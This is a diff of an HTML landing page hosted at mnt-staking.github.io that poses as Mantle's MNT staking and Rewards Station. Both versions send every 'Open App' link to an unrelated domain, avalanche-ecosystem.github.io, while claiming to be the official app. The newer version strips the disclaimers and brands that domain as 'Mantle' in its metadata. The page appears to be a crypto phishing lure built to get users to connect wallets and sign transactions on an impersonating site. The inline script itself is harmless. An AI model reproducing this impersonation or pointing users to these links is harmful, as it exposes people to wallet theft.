@@ -1,47 +1,90 @@
 <!doctype html>
-<html lang="en"><head>
-<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>MNT Staking - Open App</title><meta name="description" content="mnt staking starts at Mantle Rewards Station: lock MNT, allocate Mantle Power, and check available rewards in the official app.">
-<meta name="robots" content="index,follow,max-image-preview:large">
-<link rel="canonical" href="https://mnt-staking.github.io/"><meta name="theme-color" content="#FFFFFF">
-<meta property="og:type" content="website"><meta property="og:title" content="MNT Staking - Open App"><meta property="og:description" content="mnt staking starts at Mantle Rewards Station: lock MNT, allocate Mantle Power, and check available rewards in the official app.">
-<meta property="og:url" content="https://mnt-staking.github.io/"><meta property="og:image" content="https://mnt-staking.github.io/og-cover.png"><meta property="og:locale" content="en">
-<meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="MNT Staking - Open App"><meta name="twitter:description" content="mnt staking starts at Mantle Rewards Station: lock MNT, allocate Mantle Power, and check available rewards in the official app."><meta name="twitter:image" content="https://mnt-staking.github.io/og-cover.png">
-<link rel="icon" href="favicon.png" type="image/png"><link rel="manifest" href="site.webmanifest"><link rel="apple-touch-icon" href="static/icon-180.png">
-<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600;700&display=swap">
-<link rel="stylesheet" href="static/style.css">
-<script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"WebSite","@id":"https://mnt-staking.github.io/#website","url":"https://mnt-staking.github.io/","name":"Mantle Rewards Station"},{"@type":"WebPage","@id":"https://mnt-staking.github.io/#webpage","url":"https://mnt-staking.github.io/","name":"MNT Staking - Open App","description":"mnt staking starts at Mantle Rewards Station: lock MNT, allocate Mantle Power, and check available rewards in the official app.","inLanguage":"en","isPartOf":{"@id":"https://mnt-staking.github.io/#website"}},{"@type":"Organization","@id":"https://mnt-staking.github.io/#org","name":"Mantle Rewards Station","url":"https://mnt-staking.github.io/","logo":"https://mnt-staking.github.io/og-cover.png","sameAs":["https://x.com/0xMantle","https://github.com/mantlenetworkio","https://www.coingecko.com/en/coins/mantle"]},{"@type":"WebApplication","@id":"https://mnt-staking.github.io/#app","name":"MNT Staking","url":"https://mnt-staking.github.io/","applicationCategory":"FinanceApplication","operatingSystem":"Web","browserRequirements":"Requires JavaScript","description":"mnt staking starts at Mantle Rewards Station: lock MNT, allocate Mantle Power, and check available rewards in the official app.","featureList":["Official rewards.mantle.xyz app","MNT lock and allocation flow","Wallet-connected rewards dashboard"],"isPartOf":{"@id":"https://mnt-staking.github.io/#website"}},{"@type":"FAQPage","@id":"https://mnt-staking.github.io/#faq","inLanguage":"en","mainEntity":[{"@type":"Question","name":"Does MNT staking have a fixed APY?","acceptedAnswer":{"@type":"Answer","text":"MNT Rewards Station participation does not present like a fixed validator APY. Rewards depend on active events, lock periods, allocation decisions, pool rules, and token prices. Investopedia's APY explainer is a useful reference for why a stated annual percentage yield should be distinguished from campaign-specific crypto rewards."}},{"@type":"Question","name":"What is MNT Power?","acceptedAnswer":{"@type":"Answer","text":"MNT Power is the reward-allocation weight shown in Mantle Rewards Station. The Rewards Station participation page describes locking MNT, selecting a lock-in period, allocating Mantle Power, and claiming available rewards under the active campaign rules."}},{"@type":"Question","name":"Can I delegate MNT without locking it?","acceptedAnswer":{"@type":"Answer","text":"Mantle Delegate says delegation activates voting power while users retain control because delegation does not lock or transfer tokens. That is different from Rewards Station locking, which is used for rewards participation under specific campaign rules."}},{"@type":"Question","name":"Where do I claim Mantle rewards?","acceptedAnswer":{"@type":"Answer","text":"Mantle rewards tied to MNT locking are claimed through Rewards Station when claims are available. DefiLlama's Mantle chain dashboard is useful context for broader ecosystem activity, but claim timing still depends on the specific pool or campaign."}},{"@type":"Question","name":"Is MNT the same as mETH?","acceptedAnswer":{"@type":"Answer","text":"No. MNT is Mantle's ecosystem and governance token. The mETH Protocol site describes mETH as a liquid staking receipt token for ETH, so MNT locking relates to Mantle rewards and governance while mETH relates to ETH staking and redemption mechanics."}},{"@type":"Question","name":"Which wallet do I need for MNT staking?","acceptedAnswer":{"@type":"Answer","text":"MNT locking and delegation use on-chain wallet connections, typically through EVM-compatible wallets. Revoke.cash's token approval guide is a useful reference for why users should review spender permissions before signing approvals in any wallet."}}]}]}</script>
-</head><body>
-<header class="site-header">
-  <a class="brand" href="#top" aria-label="Mantle Rewards Station"><img class="brand-mark" src="favicon.png" alt="" width="34" height="34"><span class="brand-name">Mantle Rewards Station</span></a>
-  <nav class="site-nav" aria-label="Primary"><ul class="nav-list"><li><a href="#about">About</a></li><li><a href="#facts">Overview</a></li><li><a href="#faq">FAQ</a></li></ul></nav>
-  <span class="header-spacer"></span>
-  <a class="btn btn-dark header-cta" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a>
-  <button class="nav-toggle" aria-label="Menu" aria-expanded="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
-</header>
-<main id="top">
-  <section class="hero">
-    <div class="hero-deco" aria-hidden="true"><span class="strip"></span><span class="d1"></span><span class="d2"></span><span class="d3"></span><span class="d4"></span><span class="d5"></span></div>
-    <div class="container">
-      <h1>MNT Staking</h1>
-      <div class="bridge-widget" role="group" aria-label="Mantle Rewards Station preview"><div class="bw-field"><span class="bw-coin mono">MNT</span><span class="bw-meta"><span class="bw-amount">0</span><span class="bw-sub"><b>MNT</b> · Mantle Network</span></span></div><div class="bw-apy"><b>APY</b><span>est*</span></div><div class="bw-field"><span class="bw-coin mono">MNT</span><span class="bw-meta"><span class="bw-amount">0.0</span><span class="bw-sub"><b>MNT Power</b> · Mantle Rewards Station</span></span></div><a class="btn btn-dark bw-go" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a></div>
-      <div class="hero-go"><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open Mantle Rewards Station ↗</a></div>
-      <p class="hero-note">Live preview — APY is indicative; check the live rate in the official Mantle Rewards Station app.</p>
-      <div class="trust-row"><span class="trust-chip">Official rewards.mantle.xyz app</span><span class="trust-chip">MNT lock and allocation flow</span><span class="trust-chip">Wallet-connected rewards dashboard</span></div>
-    </div>
-  </section>
-  <section class="section" id="about"><div class="container"><h2>What is MNT Staking?</h2><div class="capsule"><strong>Mantle Rewards Station</strong> is Mantle's official rewards app for locking MNT, allocating Mantle Power to pools, and claiming available rewards. Mantle's <a class="inline-link" href="https://docs.mantle.xyz/governance/parameters/tokenomics" rel="noopener noreferrer">tokenomics summary</a> describes MNT as both a governance token and a utility token used for gas fees on Mantle Network and as a principal asset within Rewards Station.</div></div></section>
-  <section class="section" id="facts"><div class="container"><h2>MNT Staking at a glance</h2><div class="facts"><div class="f"><small>Category</small><b>MNT token locking and rewards participation</b></div><div class="f"><small>Network</small><b>Mantle and Ethereum ecosystem</b></div><div class="f"><small>Token</small><b>MNT</b></div><div class="f"><small>Custody</small><b>On-chain wallet interaction through Mantle apps</b></div></div><div class="intent-a">For external context, the <a class="inline-link" href="https://www.coingecko.com/en/coins/mantle" rel="noopener noreferrer">CoinGecko MNT market page</a> tracks the token independently, while <a class="inline-link" href="https://l2beat.com/scaling/projects/mantle" rel="noopener noreferrer">L2BEAT's Mantle profile</a> frames Mantle within Ethereum layer-2 scaling research.</div></div></section>
-  <section class="section section-alt"><div class="container"><h2>MNT staking rewards on Mantle Rewards Station</h2><div class="intent-a">MNT staking intent usually points to Mantle Rewards Station, where users lock MNT, build MNT Power, allocate that power to reward pools, and claim available rewards. This is not the same as the <a class="inline-link" href="https://ethereum.org/staking/" rel="noopener noreferrer">Ethereum validator staking model</a>, and it does not have a fixed base APY. Reward value depends on active campaigns, pool rules, allocation choices, lock period, eligibility, and token prices, so <a class="inline-link" href="https://www.investopedia.com/terms/a/apy.asp" rel="noopener noreferrer">APY terminology</a> should be read carefully before comparing offers. Mantle's public Rewards Station describes the flow as lock, lock-in period, allocate, and earn. Users should check the live campaign details before locking because reward pools, claim timing, and unlock conditions can change between seasons.</div></div></section><section class="section"><div class="container"><h2>MNT lock period and unlocking rules</h2><div class="intent-a">Mantle Rewards Station asks users to lock MNT to participate in reward events, and the selected lock-in period can affect MNT Power. The important search question is not only 'how much can I earn' but also 'when can I unlock.' Before confirming, users should review the available-to-unlock balance, selected lock period, pool details, and any claim schedule shown in the app. If MNT is locked for a campaign, it should not be treated like liquid wallet balance. The safest summary is that unlock mechanics are campaign-specific and should be verified against the <a class="inline-link" href="https://rewards.mantle.xyz/" rel="noopener noreferrer">Rewards Station lock-and-allocate flow</a>.</div></div></section><section class="section section-alt"><div class="container"><h2>MNT token, Mantle Network, and staking utility</h2><div class="intent-a">MNT is the Mantle ecosystem token used across Mantle governance and Mantle Network activity. Mantle describes token holders as participating in strategic direction through proposals and voting, while the Rewards Station adds a separate lock-and-allocate rewards layer. That means MNT utility is broader than a simple staking yield token: it is connected to governance, ecosystem incentives, and Mantle's L2 products, which can be cross-checked through <a class="inline-link" href="https://l2beat.com/scaling/projects/mantle" rel="noopener noreferrer">independent L2 risk coverage</a>. The token also has market listings such as the <a class="inline-link" href="https://www.coingecko.com/en/coins/mantle" rel="noopener noreferrer">Mantle price and market listing</a>, but campaign rewards should not be confused with guaranteed yield. Real returns depend on active reward programs and market conditions.</div></div></section>
-  <section class="section"><div class="container"><h2>How to stake MNT Staking</h2><ol class="steps"><li><b>Open the app</b><span>Go to the official Mantle Rewards Station domain and connect the wallet that holds MNT.</span></li><li><b>Lock MNT</b><span>Enter the amount, review the lock terms, and confirm the transaction in your wallet; Ethereum's <a class="inline-link" href="https://ethereum.org/developers/docs/transactions/" rel="noopener noreferrer">transaction primer</a> explains why signed transactions and gas fees matter.</span></li><li><b>Choose duration</b><span>Select the lock-in period shown by the app; longer periods may affect Mantle Power.</span></li><li><b>Allocate and claim</b><span>Allocate Mantle Power to available reward pools, then return to the dashboard to view and claim rewards when available. If the app asks for token spending permission, compare it with the <a class="inline-link" href="https://eips.ethereum.org/EIPS/eip-20" rel="noopener noreferrer">ERC-20 approve and allowance standard</a>.</span></li></ol><div class="cta-band"><div><p>Ready to stake?</p><p class="sub">Open the official Mantle Rewards Station app and verify the domain before you sign.</p></div><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open Mantle Rewards Station â†—</a></div></div></section>
-  <section class="section"><div class="container"><h2>MNT locking vs Mantle delegation</h2><div class="intent-a">This comparison matters because <a class="inline-link" href="https://delegatevote.mantle.xyz/" rel="noopener noreferrer">Mantle Delegate's voting-power page</a> says delegation does not lock or transfer tokens, while Rewards Station participation is built around locking MNT for campaign rewards.</div><div class="cmp-wrap"><table class="cmp-table"><thead><tr><th>Dimension</th><th>MNT locking</th><th>MNT delegation</th></tr></thead><tbody><tr><td>Primary goal</td><td>Join rewards pools and build MNT Power</td><td>Use voting power in governance</td></tr><tr><td>Token movement</td><td>MNT is locked under app rules</td><td>Delegation does not transfer tokens</td></tr><tr><td>Return profile</td><td>Campaign-dependent rewards</td><td>Governance participation, not fixed yield</td></tr><tr><td>Where</td><td>Mantle Rewards Station</td><td>Mantle Delegate and Snapshot</td></tr></tbody></table></div></div></section>
-  <section class="section section-alt"><div class="container"><h2>Fees, custody, and security checks</h2><div class="facts"><div class="f"><small>Fees</small><b>Review gas before signing; <a class="inline-link" href="https://defillama.com/fees/chains" rel="noopener noreferrer">DefiLlama's chain fee dashboard</a> gives market context, but the wallet prompt is the source for your transaction. On-chain actions are generally irreversible; educational only, not financial advice.</b></div><div class="f"><small>Custody</small><b>Token approvals can let contracts spend assets under the <a class="inline-link" href="https://eips.ethereum.org/EIPS/eip-20" rel="noopener noreferrer">ERC-20 allowance mechanism</a>, so check spender and amount before confirming. On-chain actions are generally irreversible; educational only, not financial advice.</b></div><div class="f"><small>Security</small><b>Use tools such as <a class="inline-link" href="https://revoke.cash/learn/approvals/what-are-token-approvals" rel="noopener noreferrer">Revoke.cash's approval guide</a> to understand approval risk before connecting to unfamiliar pages. On-chain actions are generally irreversible; educational only, not financial advice.</b></div></div></div></section>
-  <section class="section section-alt" id="faq"><div class="container"><h2>MNT Staking FAQ</h2><div class="faq-list"><details open><summary><h3>Does MNT staking have a fixed APY?</h3></summary><div>MNT Rewards Station participation does not present like a fixed validator APY. Rewards depend on active events, lock periods, allocation decisions, pool rules, and token prices. <a class="inline-link" href="https://www.investopedia.com/terms/a/apy.asp" rel="noopener noreferrer">Investopedia's APY explainer</a> is a useful reference for why a stated annual percentage yield should be distinguished from campaign-specific crypto rewards.</div></details><details><summary><h3>What is MNT Power?</h3></summary><div>MNT Power is the reward-allocation weight shown in Mantle Rewards Station. The <a class="inline-link" href="https://rewards.mantle.xyz/" rel="noopener noreferrer">Rewards Station participation page</a> describes locking MNT, selecting a lock-in period, allocating Mantle Power, and claiming available rewards under the active campaign rules.</div></details><details><summary><h3>Can I delegate MNT without locking it?</h3></summary><div><a class="inline-link" href="https://delegatevote.mantle.xyz/" rel="noopener noreferrer">Mantle Delegate</a> says delegation activates voting power while users retain control because delegation does not lock or transfer tokens. That is different from Rewards Station locking, which is used for rewards participation under specific campaign rules.</div></details><details><summary><h3>Where do I claim Mantle rewards?</h3></summary><div>Mantle rewards tied to MNT locking are claimed through Rewards Station when claims are available. <a class="inline-link" href="https://defillama.com/chain/mantle" rel="noopener noreferrer">DefiLlama's Mantle chain dashboard</a> is useful context for broader ecosystem activity, but claim timing still depends on the specific pool or campaign.</div></details><details><summary><h3>Is MNT the same as mETH?</h3></summary><div>No. MNT is Mantle's ecosystem and governance token. The <a class="inline-link" href="https://www.methprotocol.xyz/" rel="noopener noreferrer">mETH Protocol site</a> describes mETH as a liquid staking receipt token for ETH, so MNT locking relates to Mantle rewards and governance while mETH relates to ETH staking and redemption mechanics.</div></details><details><summary><h3>Which wallet do I need for MNT staking?</h3></summary><div>MNT locking and delegation use on-chain wallet connections, typically through EVM-compatible wallets. <a class="inline-link" href="https://revoke.cash/learn/approvals/what-are-token-approvals" rel="noopener noreferrer">Revoke.cash's token approval guide</a> is a useful reference for why users should review spender permissions before signing approvals in any wallet.</div></details></div></div></section>
-</main>
-<footer class="site-footer"><div class="container">
-  <p class="footer-note">Not the official app; verify the rewards.mantle.xyz domain before connecting. Educational only, not financial advice.</p>
-  <p class="footer-meta"><a href="#top">Back to top ↑</a></p>
-</div></footer>
-<script src="static/app.js" defer></script>
-</body></html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>MNT Staking</title>
+  <meta name="description" content="MNT Staking lets you stake MNT and receive a liquid staking token you can use across DeFi from your own wallet.">
+  <link rel="canonical" href="https://mnt-staking.github.io/">
+  <meta name="robots" content="index,follow,max-image-preview:large">
+  <meta name="theme-color" content="#F4F6FB">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="MNT Staking">
+  <meta property="og:description" content="MNT Staking lets you stake MNT and receive a liquid staking token you can use across DeFi from your own wallet.">
+  <meta property="og:url" content="https://mnt-staking.github.io/">
+  <meta property="og:image" content="https://mnt-staking.github.io/og-cover.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="MNT Staking">
+  <meta name="twitter:description" content="Stake MNT and receive a liquid staking token you can use across DeFi.">
+  <link rel="icon" type="image/png" href="favicon.png">
+  <link rel="manifest" href="site.webmanifest">
+  <link rel="apple-touch-icon" href="favicon.png">
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <header class="topbar">
+    <a class="brand" href="#"><img src="favicon.png" width="28" height="28" alt="" style="border-radius:50%"> MNT Staking</a>
+    <nav class="nav" aria-label="Trusted references">
+      <a href="https://explorer.mantle.xyz/" target="_blank" rel="nofollow noopener noreferrer">Mantle Explorer</a>
+      <a href="https://www.mantle.xyz/" target="_blank" rel="nofollow noopener noreferrer">Mantle docs</a>
+      <a href="https://defillama.com/chain/Mantle" target="_blank" rel="nofollow noopener noreferrer">DefiLlama</a>
+    </nav>
+    <span class="sp"></span>
+    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
+  </header>
+
+  <main class="stage">
+    <h1>MNT Staking</h1>
+    <p class="sub"><strong>MNT Staking</strong> lets you stake MNT and receive a liquid staking token you can use across DeFi from your own wallet.</p>
+
+    <section class="card" aria-label="Staking route">
+      <div class="route">
+        <div class="leg">
+          <span class="lbl">Stake</span>
+          <span class="chip">
+            <img class="ic" src="mnt.png" width="26" height="26" alt="MNT">
+            <span class="t">MNT</span>
+          </span>
+        </div>
+        <button class="dir" type="button" data-dir aria-label="Switch direction"><span class="ar">&#8594;</span></button>
+        <div class="leg">
+          <span class="lbl">Receive</span>
+          <span class="chip">
+            <img class="ic" src="mnt.png" width="26" height="26" alt="stMNT">
+            <span class="t">stMNT</span>
+          </span>
+        </div>
+      </div>
+      <a class="act" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App <span aria-hidden="true">&#8250;</span></a>
+      <p class="note">Preview only &mdash; rewards and terms are shown in the app.</p>
+    </section>
+  </main>
+
+  <footer class="foot">
+    <b>MNT Staking</b> &mdash; 2026
+  </footer>
+
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@graph": [
+      { "@type": "WebSite", "@id": "https://avalanche-ecosystem.github.io/#website", "url": "https://avalanche-ecosystem.github.io/", "name": "MNT Staking", "inLanguage": "en" },
+      { "@type": "Organization", "@id": "https://avalanche-ecosystem.github.io/#org", "name": "Mantle", "url": "https://avalanche-ecosystem.github.io/", "sameAs": ["https://www.mantle.xyz/","https://x.com/0xMantle","https://docs.mantle.xyz/"] },
+      { "@type": "WebApplication", "@id": "https://avalanche-ecosystem.github.io/#app", "name": "MNT Staking", "applicationCategory": "FinanceApplication", "operatingSystem": "Web", "url": "https://avalanche-ecosystem.github.io/", "offers": { "@type": "Offer", "price": "0", "priceCurrency": "USD" } }
+    ]
+  }
+  </script>
+
+  <script>
+  (function(){
+    "use strict";
+    var root=document, btn=root.querySelector('[data-dir]');
+    if(!btn) return;
+    btn.addEventListener('click', function(){
+      var chips=root.querySelectorAll('.leg .chip');
+      if(chips.length>=2){ var t=chips[0].innerHTML; chips[0].innerHTML=chips[1].innerHTML; chips[1].innerHTML=t; }
+    });
+  })();
+  </script>
+</body>
+</html>
